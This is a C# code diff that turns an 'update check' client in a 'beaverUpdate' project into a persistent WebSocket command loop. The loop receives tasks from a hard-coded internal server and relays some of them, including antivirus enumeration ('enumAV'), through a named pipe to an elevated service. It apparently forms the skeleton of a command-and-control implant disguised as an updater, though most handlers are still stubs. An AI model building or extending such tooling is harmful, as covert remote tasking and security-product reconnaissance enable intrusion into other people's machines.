@@ -6,69 +6,138 @@ using System.Threading.Tasks;
 using System.Net.WebSockets;
 using System.Threading;
 using Newtonsoft.Json;
+using System.Collections.Concurrent;
+using System.IO.Pipes;
+using System.IO;
 
 namespace beaverUpdate
 {
     public class CommSDK
     {
-        private ClientWebSocket _webSocket;
-        private const string endpoint = "ws://192.168.1.202/checkupdate";
+        public static ConcurrentQueue<string> messageQueue = new ConcurrentQueue<string>();
+        public static CancellationTokenSource sendCancellationTokenSource = new CancellationTokenSource();
 
-        public async Task<string> CheckIn(string clientName)
+        public static async Task ListenToWebSocketAsync(string uri)
         {
-            await Connect(endpoint + $"?client={clientName}");
-
-            var buffer = new byte[1024 * 4];
-            var result = await _webSocket.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
-            string message = Encoding.UTF8.GetString(buffer, 0, result.Count);
-
-            // Wait for at least 30 seconds
-            await Task.Delay(30000);
-
-            // Check if the received message contains a task
-            var response = JsonConvert.DeserializeObject<dynamic>(message);
-            if (response?.task != null)
+            using (ClientWebSocket webSocket = new ClientWebSocket())
             {
-                return response.task.ToString();
+                try
+                {
+                    // Connect to the WebSocket server
+                    await webSocket.ConnectAsync(new Uri(uri), CancellationToken.None);
+
+                    byte[] buffer = new byte[1024 * 4];
+                    var receiveBuffer = new ArraySegment<byte>(buffer);
+                    var sendCancellationToken = sendCancellationTokenSource.Token;
+
+                    while (webSocket.State == WebSocketState.Open)
+                    {
+                        // Check if there is a message to send
+                        string messageToSend;
+                        if (messageQueue.TryDequeue(out messageToSend))
+                        {
+                            byte[] messageBytes = Encoding.UTF8.GetBytes(messageToSend);
+                            var sendBuffer = new ArraySegment<byte>(messageBytes);
+
+                            await webSocket.SendAsync(sendBuffer, WebSocketMessageType.Text, true, CancellationToken.None);
+                            Console.WriteLine($"Sent: {messageToSend}");
+                        }
+
+                        // Receive the message from the server
+                        WebSocketReceiveResult result;
+
+                        using (var ms = new System.IO.MemoryStream())
+                        {
+                            do
+                            {
+                                result = await webSocket.ReceiveAsync(receiveBuffer, sendCancellationToken);
+                                ms.Write(receiveBuffer.Array, receiveBuffer.Offset, result.Count);
+                            } while (!result.EndOfMessage);
+
+                            // Reset the buffer and get the received message as a string
+                            ms.Seek(0, System.IO.SeekOrigin.Begin);
+                            using (var reader = new System.IO.StreamReader(ms))
+                            {
+                                string receivedText = await reader.ReadToEndAsync();
+
+                                // Handle different types of messages
+                                if (receivedText.StartsWith("syncregister"))
+                                {
+                                    Console.WriteLine($"Received command1: {receivedText}");
+                                    // Execute async task for command1
+                                    await Task.Run(() => SyncRegister());
+                                }
+                                else if (receivedText.StartsWith("syncunregister"))
+                                {
+                                    Console.WriteLine($"Received command2: {receivedText}");
+                                    // Execute async task for command2
+                                    await Task.Run(() => SyncUnregister());
+                                } // ALL TASKS BELOW ARE RUN BY BEAVER ELEVATE SERVICE THROUGH NAMED PIPE
+                                else if (receivedText.StartsWith("enumAV"))
+                                {
+                                    Console.WriteLine($"Received command3: {receivedText}");
+                                    // Execute async task for command3
+                                    await Task.Run(() => SendRequest("enumAV"));
+                                }
+                                else
+                                {
+                                    Console.WriteLine($"Unknown command received: {receivedText}");
+                                }
+                            }
+                        }
+
+                        // Wait before checking for the next message to send
+                        await Task.Delay(50, sendCancellationToken);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"An error occurred: {ex.Message}");
+                }
             }
-
-            throw new Exception("No valid update received within 30 seconds.");
         }
 
-        public async Task Register(string clientName, object jsonObject)
+        private static void EnqueueMessage(string message)
         {
-            await Connect(endpoint + $"?client={clientName}");
-            var jsonMessage = JsonConvert.SerializeObject(jsonObject);
-            await SendMessageAsync(jsonMessage);
-            await Disconnect();
+            // Add a new message to the queue
+            messageQueue.Enqueue(message);
+            // Signal that there is a new message to send
+            sendCancellationTokenSource.Cancel();
         }
 
-        // supplementary
-        private async Task Connect(string url)
+        private static void SyncRegister()
         {
-            _webSocket = new ClientWebSocket();
-            await _webSocket.ConnectAsync(new Uri(url), CancellationToken.None);
-            //Console.WriteLine("Connected to WebSocket server.");
+            // Run BeaverSync /register currentuser
+            Console.WriteLine($"Executing SyncRegister()");
         }
 
-        private async Task SendMessageAsync(string message)
+        private static void SyncUnregister()
         {
-            var buffer = Encoding.UTF8.GetBytes(message);
-            var segment = new ArraySegment<byte>(buffer);
+            // Run BeaverSync /unregister
+            Console.WriteLine($"Executing SyncUnregister()");
+        }
 
-            if (_webSocket.State == WebSocketState.Open)
+        private static void ExecuteCommand3(string message)
+        {
+            // Implementation for command3
+            Console.WriteLine($"Executing command3 with: {message}");
+        }
+
+        private static async Task SendRequest(string command)
+        {
+            using (NamedPipeClientStream pipeClient = new NamedPipeClientStream(".", "BeaverOnThePipe", PipeDirection.InOut))
             {
-                await _webSocket.SendAsync(segment, WebSocketMessageType.Text, true, CancellationToken.None);
-            }
-        }
+                Console.WriteLine("Connecting to server...");
+                await pipeClient.ConnectAsync(); // Use ConnectAsync for asynchronous connection
+                Console.WriteLine("Connected to server.");
+                Console.WriteLine($"Sending: {command}");
 
-        private async Task Disconnect()
-        {
-            if (_webSocket.State != WebSocketState.Closed && _webSocket.State != WebSocketState.CloseSent)
-            {
-                await _webSocket.CloseAsync(WebSocketCloseStatus.NormalClosure, "Closing", CancellationToken.None);
+                using (StreamWriter writer = new StreamWriter(pipeClient))
+                {
+                    await writer.WriteAsync(command); // Use WriteAsync for asynchronous writing
+                    await writer.FlushAsync(); // Ensure the data is written
+                }
             }
-            //Console.WriteLine("Disconnected from WebSocket server.");
         }
     }
 }
